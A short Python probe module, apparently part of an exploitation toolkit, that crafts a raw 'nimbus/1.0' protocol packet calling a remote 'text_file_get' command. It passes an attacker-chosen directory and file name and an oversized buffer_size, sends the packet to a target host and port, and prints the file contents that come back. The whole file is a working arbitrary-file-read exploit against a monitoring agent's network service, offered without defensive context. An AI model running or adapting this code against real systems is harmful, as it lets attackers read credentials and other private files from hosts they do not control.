'''

text_file_get: read any text file from the filesystem

'''

BYTES = "999999999\x00"

from probes.dependencies import *

def generate_probe(directory, filename):

  filename  += "\x00"
  directory += "\x00"

  packet_header = "nimbus/1.0 {:d} {:d}\r\n"
  packet_body = (
  "mtype\x00"
  "7\x004\x00100\x00"
  "cmd\x00"
  "7\x0014\x00"
  "text_file_get\x00"
  "seq\x00"
  "1\x002\x000\x00"
  "ts\x00"
  "1\x0011\x001570667980\x00"
  "frm\x00"
  )
  packet_body += "7\x00{:d}\x00".format(len(CLIENT))
  packet_body += CLIENT
  packet_body += (
  "tout\x00"
  "1\x004\x00180\x00"
  "addr\x00"
  "7\x000\x00"
  )

  packet_args  = "directory\x00"
  packet_args += "7\x00{:d}\x00".format(len(directory))
  packet_args += directory
  packet_args += "file\x00"
  packet_args += "7\x00{:d}\x00".format(len(filename))
  packet_args += filename
  packet_args += "buffer_size\x00"
  packet_args += "1\x00{:d}\x00{:s}".format(len(BYTES), BYTES)

  packet_header = packet_header.format(
    len(packet_body),
    len(packet_args)
  )

  probe = packet_header + packet_body + packet_args

  return bytes(probe, 'utf-8')

def parse(response):

  flist = response.decode().split('\x00')
  index = flist.index("file_content")
  final = flist[index+3:]

  p_good("Probe successful\n")
  for i in range(len(final)):
    print(final[i])

def probe(host, port, directory, filename):
  probe = generate_probe(directory, filename)

  p_info("Sending text_file_get probe to %s:%d" % (host, port))
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  try:
    sock.connect((host, port))
    sock.send(probe)
    parse(sock.recv(4096))
  except:
    p_error("Failed to connect to %s:%d" % (host, port))
